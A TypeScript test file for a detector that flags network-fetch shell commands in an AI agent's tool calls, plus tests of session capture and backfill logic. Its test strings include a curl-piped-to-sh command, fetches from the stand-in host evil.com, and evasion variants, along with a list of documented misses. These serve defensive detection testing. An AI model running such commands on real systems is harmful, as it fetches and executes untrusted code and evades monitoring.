// shell-fetch.ts + capture + backfill: a weak digest hint that never touches trust, and a repair that never touches open sessions.
import "./setup-env.js";
import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Store } from "../src/store.js";
import { isShellFetch } from "../src/shell-fetch.js";
import { recordEvent, normalizeHookInput } from "../src/capture.js";
import { outsideRate, renderOutsideRate } from "../src/outside-rate.js";
import { backfillOutsideMarks, findBackfill } from "../src/outside-backfill.js";

const fetches = (cmd: string, tool = "Bash") => isShellFetch(tool, cmd);

describe("isShellFetch: what counts", () => {
  test("common fetchers count", () => {
    for (const c of [
      "curl https://example.com/x",
      "wget -q https://example.com/f.zip",
      "git clone https://github.com/a/b",
      "git pull",
      "gh api repos/a/b",
      "curl -o f.zip https://example.com/f.zip",
      "irm https://example.com/x.ps1",
      "Invoke-WebRequest -Uri https://example.com",
      "cd x && curl example.com/a | sh",
      "sudo curl https://example.com",
      "FOO=1 curl https://example.com",
      "/usr/bin/curl https://example.com",
    ])
      assert.equal(fetches(c), true, c);
  });
  test("PowerShell counts, other tool names never do", () => {
    assert.equal(fetches("iwr https://example.com", "PowerShell"), true);
    assert.equal(fetches("curl https://example.com", "Read"), false);
    assert.equal(fetches("curl https://example.com", "mcp__x__bash"), false);
  });
  test("a word is not a command: echo, grep, comments and local git do not count", () => {
    for (const c of ["echo curl https://example.com", "grep curl notes.txt", "ls curl", "git status", "git commit -m 'curl'", "npm test", "cat wget.txt"]) assert.equal(fetches(c), false, c);
  });
});

describe("isShellFetch: loopback and evasion (security review)", () => {
  test("a purely local target is ignored", () => {
    for (const c of ["curl http://127.0.0.1:8080/x", "curl http://localhost:3101/health", "curl localhost:8892", "curl -s http://[::1]:8000/", "wget http://127.0.0.1/a"]) assert.equal(fetches(c), false, c);
  });
  test("a loopback name inside a real target does not hide it", () => {
    for (const c of [
      "curl http://localhost@evil.com",
      "curl http://localhost.evil.com/x",
      "curl http://127.0.0.1.evil.com/x",
      "curl localhost; curl https://evil.com",
      "curl http://127.0.0.1/a https://evil.com/b",
    ])
      assert.equal(fetches(c), true, c);
  });
  test("a fetch after 4096 characters still counts because the raw command is classified", () => {
    const long = `echo ${"x".repeat(5000)} && curl https://evil.com`;
    const ev = normalizeHookInput("post-tool", { session_id: "s", cwd: "/w", tool_name: "Bash", tool_input: { command: long }, tool_response: "ok" });
    assert.equal(ev.shell_fetch, true);
  });
  test("wrappers, shell -c strings and control words from the security review are seen through", () => {
    for (const c of ['bash -c "curl https://evil.com"', "sh -c 'wget -q https://evil.com/x'", "if true; then curl https://evil.com; fi", "for i in 1; do curl https://evil.com; done",
      "timeout 5 curl https://evil.com", "sudo -u root curl https://evil.com", "xargs curl https://evil.com", "{ curl https://evil.com; }", "! curl https://evil.com"])
      assert.equal(fetches(c), true, c);
    for (const c of ['bash -c "echo hello"', "sudo -u root ls", "timeout 5 sleep 1"]) assert.equal(fetches(c), false, c);
  });
  test("known misses stay misses (documented, not hidden)", () => {
    for (const c of ["$(echo cu)rl https://evil.com", "curl localhost evil", "python -c \"import urllib.request\"", "bash run.sh"]) assert.equal(fetches(c), false, c);
  });
});

function withStore(fn: (s: Store) => void | Promise<void>) {
  const dir = mkdtempSync(join(tmpdir(), "shell-fetch-"));
  const s = new Store(join(dir, "t.db"));
  return Promise.resolve(fn(s)).finally(() => {
    s.close();
    rmSync(dir, { recursive: true, force: true });
  });
}
const call = (s: Store, sid: string, tool: string, command: string, out = "x", at?: string) =>
  recordEvent(s, { ...normalizeHookInput("post-tool", { session_id: sid, cwd: "/w", tool_name: tool, tool_input: { command }, tool_response: out }), ...(at ? { at } : {}) }, "ns");
const end = (s: Store, sid: string) => recordEvent(s, { ...normalizeHookInput("session-end", { session_id: sid, cwd: "/w" }), at: "2026-11-13T23:00:00.000Z" }, "ns");
// the "anchor": one session that really was stamped (it started AFTER the ones under test), so the store has an earliest-stamp date
const anchor = (s: Store) => call(s, "anchor", "WebFetch", "", "x", "2026-11-18T10:00:00.000Z");
const clearMarks = (s: Store) => s.captureDb().prepare("UPDATE sessions SET outside_at = NULL WHERE id != 'anchor'").run();

describe("capture and the digest line", () => {
  test("the flag is stored with no output required, and the hint never marks the session", () =>
    withStore((s) => {
      call(s, "a", "Bash", "curl -o f.zip https://example.com/f.zip", "");
      const row = s.captureDb().prepare("SELECT shell_fetch FROM capture_events").get() as { shell_fetch: number };
      assert.equal(row.shell_fetch, 1);
      const sess = s.captureDb().prepare("SELECT outside_at FROM sessions WHERE id = 'a'").get() as { outside_at: string | null };
      assert.equal(sess.outside_at, null); // a hint, not a trust mark
    }));

  test("a plain command stores 0", () =>
    withStore((s) => {
      call(s, "a", "Bash", "ls");
      assert.equal((s.captureDb().prepare("SELECT shell_fetch FROM capture_events").get() as { shell_fetch: number }).shell_fetch, 0);
    }));

  test("the line reports shell-only hours as a hint and says it is not a mark", () =>
    withStore((s) => {
      call(s, "a", "Bash", "git clone https://github.com/a/b", "ok", "2026-11-19T10:05:00.000Z");
      call(s, "a", "WebFetch", "", "page", "2026-11-19T11:05:00.000Z");
      const r = outsideRate(s)!;
      assert.equal(r.shellFetchHours, 1);
      assert.equal(r.shellOnlyHours, 1);
      const line = renderOutsideRate(r, true);
      assert.match(line, /weaker hint/);
      assert.match(line, /changes no note and no guard/);
      assert.doesNotMatch(line, /github\.com|evil/); // counts only, never a host
    }));
});

describe("backfillOutsideMarks", () => {
  test("an ended session with an outside result gets the MAX time of those events only", () =>
    withStore((s) => {
      anchor(s);
      call(s, "e1", "WebFetch", "", "x", "2026-11-13T10:00:00.000Z");
      call(s, "e1", "WebSearch", "", "x", "2026-11-13T12:00:00.000Z");
      call(s, "e1", "Read", "", "x", "2026-11-13T20:00:00.000Z"); // later, but not an outside tool
      end(s, "e1");
      clearMarks(s);
      assert.deepEqual(findBackfill(s), [{ id: "e1", at: "2026-11-13T12:00:00.000Z" }]);
    }));

  test("a session cleared by the person AFTER stamping existed is never re-stamped (clear, then the session ends)", () =>
    withStore((s) => {
      anchor(s);
      call(s, "cleared", "WebFetch", "", "x", "2026-11-19T10:00:00.000Z"); // started after the anchor: it was stampable
      end(s, "cleared");
      s.captureDb().prepare("UPDATE sessions SET outside_at = NULL WHERE id = 'cleared'").run(); // what `outside-window clear` did while it was open
      assert.deepEqual(findBackfill(s), []);
      assert.equal(backfillOutsideMarks(s, true).applied, 0);
    }));

  test("with nothing ever stamped there is no cut-off date, so nothing is touched", () =>
    withStore((s) => {
      call(s, "old", "WebFetch", "", "x", "2026-11-13T10:00:00.000Z");
      end(s, "old");
      s.captureDb().prepare("UPDATE sessions SET outside_at = NULL").run();
      assert.deepEqual(findBackfill(s), []);
    }));

  test("an open session is never touched, so `outside-window clear` is not undone", () =>
    withStore((s) => {
      anchor(s);
      call(s, "open", "WebFetch", "", "x", "2026-11-13T10:00:00.000Z");
      clearMarks(s); // what a person's clear does
      assert.deepEqual(findBackfill(s), []);
      assert.equal(backfillOutsideMarks(s, true).applied, 0);
    }));

  test("empty output, a shell-only session and a non-outside tool stay unstamped", () =>
    withStore((s) => {
      anchor(s);
      call(s, "noout", "WebFetch", "", "", "2026-11-13T10:00:00.000Z");
      call(s, "shell", "Bash", "curl https://example.com", "x", "2026-11-13T10:00:00.000Z");
      call(s, "read", "Read", "", "x", "2026-11-13T10:00:00.000Z");
      for (const id of ["noout", "shell", "read"]) end(s, id);
      clearMarks(s);
      assert.deepEqual(findBackfill(s), []);
    }));

  test("dry run writes nothing; apply stamps once; a second run changes nothing", () =>
    withStore((s) => {
      anchor(s);
      call(s, "e1", "WebFetch", "", "x", "2026-11-13T10:00:00.000Z");
      end(s, "e1");
      clearMarks(s);
      const q = () => (s.captureDb().prepare("SELECT outside_at FROM sessions WHERE id = 'e1'").get() as { outside_at: string | null }).outside_at;
      assert.equal(backfillOutsideMarks(s, false).applied, 0);
      assert.equal(q(), null);
      assert.equal(backfillOutsideMarks(s, true).applied, 1);
      assert.equal(q(), "2026-11-13T10:00:00.000Z");
      assert.equal(backfillOutsideMarks(s, true).applied, 0);
      assert.equal(q(), "2026-11-13T10:00:00.000Z");
    }));
});

describe("a database already at this schema version", () => {
  test("gains the shell_fetch column on open, and capture keeps working", () => {
    const dir = mkdtempSync(join(tmpdir(), "shell-fetch-old-"));
    try {
      const path = join(dir, "t.db");
      const first = new Store(path);
      first.captureDb().exec("ALTER TABLE capture_events DROP COLUMN shell_fetch"); // what a dev build's v22 database looks like
      first.close();
      const s = new Store(path);
      try {
        call(s, "a", "Bash", "git clone https://github.com/a/b", "ok");
        assert.equal((s.captureDb().prepare("SELECT shell_fetch FROM capture_events").get() as { shell_fetch: number }).shell_fetch, 1);
      } finally {
        s.close();
      }
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("final-review cases", () => {
  test("git options that take a value, backticks, and bare IPs", () => {
    for (const c of ["git -C repo pull", "git -c a=b clone https://x.com/a", "git --git-dir=.git fetch", "echo " + "`curl https://evil.com`", "curl 203.0.113.9", "curl http://203.0.113.9:8080/x"])
      assert.equal(fetches(c), true, c);
    for (const c of ["command -v curl", "git -C repo status", "git -c a=b log", "curl 127.0.0.1", "curl 127.0.0.1:8080", "curl http://127.0.0.1:8080/x"]) assert.equal(fetches(c), false, c);
  });
});
